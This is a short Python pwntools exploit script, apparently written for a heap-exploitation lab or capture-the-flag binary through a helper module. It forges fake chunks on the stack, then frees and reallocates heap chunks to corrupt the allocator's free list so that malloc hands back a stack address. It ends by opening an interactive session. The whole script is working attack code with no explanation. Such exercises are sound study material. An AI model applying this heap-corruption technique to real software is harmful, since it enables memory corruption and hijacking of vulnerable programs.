from pwn import *
from handle import *

def exploit():
	malloc(0x100)

	A = chunk_info(0)
	fake_chunk1 = stack_var_1_address()
	fake_chunk2 = stack_var_2_address()
	payload_fake_chunk = p64(0) + p64(0) + p64(A[0] - 0x10) + p64(fake_chunk2)
	write_to_stack_var_1(payload_fake_chunk)
	write_to_stack_var_2(p64(0) + p64(0) + p64(fake_chunk1))

	malloc(0x3f0)
	
	free_chunk(0)

	malloc(0x3f0)

	write_to_chunk(0, p64(A[1]) + p64(fake_chunk1))
	
	malloc(0x100)
	malloc(0x100)

p = exec_file(1)
exploit()
p.interactive()
p.close()
